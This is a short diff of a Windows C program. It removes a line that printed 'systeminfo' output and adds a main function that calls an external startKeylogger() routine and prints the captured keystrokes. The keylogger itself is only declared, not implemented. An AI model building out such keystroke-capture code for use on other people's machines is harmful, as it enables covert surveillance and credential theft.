@@ -1,10 +1,17 @@
 #include <stdio.h>
-#include "CIBRA.h"
+#include <stdlib.h>
+#include <windows.h>
 
-int main()
-{
-	printf("%s",os("systeminfo"));
+char* startKeylogger();
 
-	return 0;
+int main() {
+    char* recordedKeys = startKeylogger();
+    if (recordedKeys != NULL) {
+        printf("\nRecorded keystrokes: %s\n", recordedKeys);
+        free(recordedKeys);
+    }
 
+    return 0;
 }
+
+
